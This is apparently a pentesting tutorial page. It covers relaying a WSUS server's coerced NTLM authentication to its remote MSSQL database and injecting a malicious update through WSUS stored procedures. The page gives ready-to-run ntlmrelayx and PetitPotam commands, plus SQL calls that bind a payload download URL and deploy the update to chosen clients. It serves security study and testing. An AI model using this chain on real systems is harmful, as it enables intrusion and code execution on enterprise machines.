# WSUS External Database Relay and Update Injection

{{#include ../../banners/hacktricks-training.md}}

## Attack surface

WSUS can store `SUSDB` in a local Windows Internal Database (WID) or on a separate MSSQL server. In the second design, the upstream WSUS computer account must authenticate to MSSQL and is mapped to application database roles. If that authentication is coerced and relayed to the database, the resulting SQL session may not have direct table DML but can still mutate WSUS state through granted stored procedures.<sup>[[1]](#references)</sup>

The complete chain therefore requires all of the following:<sup>[[1]](#references)</sup>

1. An upstream WSUS server using a **remote standalone MSSQL** database.
2. A coercion primitive that makes the WSUS host authenticate to the attacker over SMB.
3. An MSSQL endpoint that accepts the relayed NTLM authentication.
4. A login mapping for the WSUS machine account with sufficient `EXECUTE` rights in `SUSDB` (the observed role was `webService`).
5. Update metadata, file hashes and payload delivery that pass the Windows Update client's integrity and signature checks.

This is different from relaying **client check-ins on WSUS HTTP/8530**. For those attacks and general prerequisites, see [NTLM relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8). For MSSQL authentication and post-exploitation basics, see [1433 - Pentesting MSSQL](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/README.md).<sup>[[1]](#references)</sup>

## Discovery from a WSUS client

The policy registry keys reveal the update server, reporting endpoint and client-side target group.<sup>[[1]](#references)</sup>

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate
```

Important values are `WUServer`, `WUStatusServer`, `TargetGroupEnabled` and `TargetGroup`. A URL on TCP/8530 or 8531 identifies the WSUS web service but does **not** reveal whether its database is WID or remote MSSQL; confirm the database host from the WSUS server configuration or by observing its SQL connections.<sup>[[1]](#references)</sup>

## Relay the WSUS machine account to MSSQL

Start an SMB-to-TDS relay and coerce the upstream WSUS host. The command shape below uses `ntlmrelayx` SOCKS mode and PetitPotam; substitute any authorized coercion primitive that works in the environment.<sup>[[1]](#references)</sup>

```bash
sudo ntlmrelayx.py -ts -t mssql://<susdb_server> -socks -smb2support

python3 PetitPotam.py <attacker_ip> <upstream_wsus_ip> \
  -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip>
```

On success, the relay should add a TDS SOCKS session for an identity such as `DOMAIN/WSUS01$`. Connect through it and select the WSUS database:<sup>[[1]](#references)</sup>

```bash
proxychains4 impacket-mssqlclient -windows-auth 'DOMAIN/WSUS01$'@<susdb_server>
```

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
```

## Find the stored-procedure write primitive

Do not stop after `SELECT`, `UPDATE` or `DELETE` against WSUS tables is denied. Application roles can be denied direct table access while retaining `EXECUTE` over procedures that perform the same state changes. [MSSQLHound](https://github.com/SpecterOps/MSSQLHound) can map the login, database-user and role relationships; the following query exposes procedure definitions needed to reconstruct the call sequence.<sup>[[1]](#references)[[5]](#references)</sup>

```sql
SELECT SCHEMA_NAME(schema_id) AS SchemaName,
       name AS ProcedureName,
       OBJECT_DEFINITION(object_id) AS Definition,
       create_date, modify_date
FROM sys.procedures
ORDER BY SchemaName, ProcedureName;
```

Check effective rights on the procedures rather than inferring them from failed table queries:<sup>[[1]](#references)</sup>

```sql
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

## WSUS update-injection state machine

WSUS update creation is stateful. A practical injection creates a **bundle parent** and a **payload child**, imports both, saves three XML fragment types for each update, maps the payload digest to a URL, and finally approves the appropriate update for a target group. SharpWSUS and WSUSpendu document the underlying procedure and fragment workflow.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

### 1. Import the parent and child

Call `spImportUpdate` once per update. Capture its output values because the local revision identifier is needed by subsequent operations. The child metadata describes the command-line handler, executable, size, SHA-1/SHA-256 digests and applicability; the bundle links to that child. Microsoft specifies that a bundled update acts as a container and should not itself carry executables or applicability rules.<sup>[[1]](#references)[[4]](#references)</sup>

```sql
DECLARE @imported int, @localRevisionID int;
EXEC dbo.spImportUpdate
  @UpdateXml = @child_update_xml,
  @UpstreamServerLocalID = 1,
  @Imported = @imported OUTPUT,
  @localRevisionID = @localRevisionID OUTPUT,
  @UpdateXmlCompressed = NULL;
SELECT @imported, @localRevisionID;
```

Use fresh GUIDs and a consistent revision number. Build clean XML from the live procedure definitions and `C:\Program Files\Update Services\Schema\SoftwareDistributionPackage.xsd`; HTML-escaped research transcripts are not reliable copy/paste payloads.<sup>[[1]](#references)</sup>

### 2. Save all XML fragments

For **each** parent and child, call `spSaveXmlFragment` for fragment type `1` (`UpdateIdentity`), `4` (`LocalizedProperties`) and `2` (`ExtendedProperties`). Omitting the fragments produces malformed update metadata. The important fields are:<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

- `UpdateIdentity`: update/revision IDs, `ExplicitlyDeployable`, prerequisites and the `BundledUpdates` relationship.
- `LocalizedProperties`: title, description, language, support URL and other console/client-facing text.
- `ExtendedProperties`: handler URI, file name and size, digests, reboot behavior, program, arguments and return-code mapping.

```sql
EXEC dbo.spSaveXmlFragment @update_guid, @revision, 1, @identity_xml, NULL;
EXEC dbo.spSaveXmlFragment @update_guid, @revision, 4, @localized_xml, NULL, 'en';
EXEC dbo.spSaveXmlFragment @update_guid, @revision, 2, @extended_xml, NULL;
```

Repeat those three calls for the other update. A command-line child can name the downloaded executable in `InstallCommand Program` and supply arguments, but execution still depends on the client accepting the file and update metadata.<sup>[[1]](#references)</sup>

### 3. Bind the digest to a download URL

`spSetBatchURL` associates the update's SHA-1 digest with `MUURL`/`USSURL` data in `tbFile`; `spGetFileLocations` verifies the resolved mapping.<sup>[[1]](#references)[[2]](#references)</sup>

```sql
EXEC dbo.spSetBatchURL @urlBatch = N'<ROOT><item FileDigest="<sha1_base64>" MUURL="http://<host>/<file>" USSURL="" /></ROOT>';
EXEC dbo.spGetFileLocations @fileDigests = <sha1_binary_0x_value>;
```

The base64 digest in update XML, binary digest passed to the lookup procedure, file size, served bytes and additional SHA-256 digest must all describe the same file. This database mapping controls where WSUS fetches the content; it does not by itself bypass Windows Update signature verification.<sup>[[1]](#references)</sup>

### 4. Select clients and deploy

Avoid deploying to `All Computers` while validating the chain. Enumerate existing groups, create a child group, resolve the desired client's `ComputerID`, add only that client, and assign the update to the new group.<sup>[[1]](#references)</sup>

```sql
EXEC dbo.spGetAllTargetGroups;
EXEC dbo.spGetComputerTargetByName @fullDomainName=N'<target.fqdn>';
EXEC dbo.spCreateTargetGroup @name=N'<group>', @id='<group_guid>',
  @targetGroupTypeName=N'Computers', @parentGroupID='<parent_group_guid>';
EXEC dbo.spAddComputerToTargetGroup @targetGroupID='<group_guid>', @computerID='<computer_guid>';
EXEC dbo.spDeployUpdate @updateID='<deployable_update_guid>', @revisionNumber=<revision>,
  @actionID=0, @targetGroupID='<group_guid>', @isAssigned=1,
  @deadline='<yyyy-mm-dd hh:mm:ss>', @adminName='<display_name>';
```

Treat the update GUIDs returned by the live database as authoritative. Research examples can label parent and child inconsistently; verify the `BundledUpdates` relationship and deploy the object that is actually marked deployable for the selected revision.<sup>[[1]](#references)</sup>

## References

- [1] [SpecterOps - Turning Enterprise Update Servers Into Backdoor Factories (0_o) - Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [2] [Nettitude - SharpWSUS](https://github.com/nettitude/SharpWSUS)
- [3] [Romain Coltel and Yves Le Provost - WSUSpendu: Use WSUS to Hang Its Clients](https://blackhat.com/docs/us-17/wednesday/us-17-Coltel-WSUSpendu-Use-WSUS-To-Hang-Its-Clients-wp.pdf)
- [4] [Microsoft Learn - Bundled Update](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902491(v=vs.85))
- [5] [SpecterOps - MSSQLHound](https://github.com/SpecterOps/MSSQLHound)

{{#include ../../banners/hacktricks-training.md}}
